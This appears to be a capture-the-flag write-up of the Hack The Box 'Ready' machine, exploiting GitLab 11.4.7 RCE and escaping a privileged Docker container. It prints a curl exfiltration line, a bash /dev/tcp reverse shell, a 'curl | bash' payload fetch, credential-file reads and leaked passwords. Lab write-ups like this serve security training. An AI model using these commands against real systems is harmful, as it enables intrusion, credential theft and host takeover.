# Scan

```bash
ghost@localhost [16:52:43] [~/Documents/hacking/tj-null-boxes/ready] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.220:22
Open 10.10.10.220:5080

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
5080/tcp open  http    syn-ack nginx
|_http-title: GitLab is not responding (502)
| http-robots.txt: 53 disallowed entries (40 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/*
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit
| /*/*/merge_requests/new /*/*/merge_requests/*.patch
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 5080

It is running GitLab server. I can login to GitLab and created an account `htb:HackTheBox`.

From `/help` I found out the GitLab version it is running, `11.4.7`, which is vulnerable to RCE.

```bash
ghost@localhost [17:03:42] [~/Documents/hacking/tj-null-boxes/ready] [master]
-> % searchsploit gitlab
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                 | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)               | ruby/webapps/49257.py
...
GitLab - 'impersonate' Feature Privilege Escalation                     | ruby/webapps/40236.txt
Gitlab-shell - Code Execution (Metasploit)                              | linux/remote/34362.rb
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

I am using the following exploit for the RCE (https://github.com/ctrlsam/GitLab-11.4.7-RCE).

The reverse shell does not work, so at `form` variable, I updated an exploit to test curl and it works. So with the below payload, I slowly try to figure out the current user name.

```bash
curl 10.10.14.4/whoami/$(whoami)

ghost@localhost [17:36:09] [~/Documents/hacking/tj-null-boxes/ready] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.220 - - [05/Nov/2022 17:36:23] "GET /whoami/git HTTP/1.1" 404 -
```

But from the enumeration, I also found out that there's user `dude` under `/home`.

Still I am not managed to get reverse shell with an exploit, but the simplest way to make it work is provide a shell script with Python server. Let it access by injection curl command to `import` payload and pipe the output to bash.

```bash
bash >& /dev/tcp/10.10.14.4/4444 0>&1
```


Then for the exploit script I updated with following command.

```bash
curl 10.10.14.4/shell.sh | bash
```

Receives a HTTP request from curl

```bash
ghost@localhost [20:52:08] [~/Documents/hacking/tj-null-boxes/ready] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.220 - - [05/Nov/2022 20:53:55] "GET /shell.sh HTTP/1.1" 200 -
```

Then got back reverse shell

```bash
ghost@localhost [20:52:06] [~/Documents/hacking/tj-null-boxes/ready] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.220] 36382
id
uid=998(git) gid=998(git) groups=998(git)
```


## Manual Exploitation

The vulnerability is with GitLab not blocking service running in local although it looks IPv4 (127.0.0.1). GitLab runs redis on local to handle their session.

Based on this (https://hackerone.com/reports/299473), I can inject system command to the payload and execute malicious code inside the redis.


# User (lateral movement)

```bash
git@gitlab:~/gitlab-rails/working$ ls /home
dude

git@gitlab:~/gitlab-rails/working$ cat /home/dude/user.txt
7f25f897b1d793852cf76026b7646666
```

So from reading `/etc/passwd` I found some users that has a shell.

```bash
git@gitlab:/home$ cat /etc/passwd | grep -v 'nologin\|false'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

Looking around found few interesting stuffs.

```bash
git@gitlab:~$ ls /opt
backup  gitlab


git@gitlab:/opt$ cat backup/docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
      - '/opt/user:/home/dude/'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16


git@gitlab:/opt$ cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

From the following file, we can also see what is the content of `gitlab.rb` file.

Using the command below, I managed to get `smtp` password.

```bash
git@gitlab:/opt$ cat backup/gitlab.rb | grep "password"
...
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
...
```

So I have 2 passwords
- YG65407Bjqvv9A0a8Tm_7w
- wW59U!ZKMbG9+*#h


# Privilege escalation

I tried `ssh` directly with those 2 passwords and both failed. Within the docker container, I tried `su -` and the second password works.

In `docker-compose.yml` we found that containers run in privilege mode. It means the container has root capabilities to all devices on the host system. So we can mount the hard drive that contains the file system, and read the root directory.

I tried `sda1` and it fails for wrong file system. So I tried `sda2` and it works.

```bash
root@gitlab:/mnt/sda2# mount /dev/sda2 /mnt/sda2

root@gitlab:/mnt/sda2# ls /mnt/sda2
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var

root@gitlab:/mnt/sda2# ls /mnt/sda2/root
docker-gitlab  ready-channel  root.txt  snap

root@gitlab:/mnt/sda2# cd /mnt/sda2/root

root@gitlab:/mnt/sda2/root# cat root.txt
13b59b693ccd055240fd3920773f4ea8
```

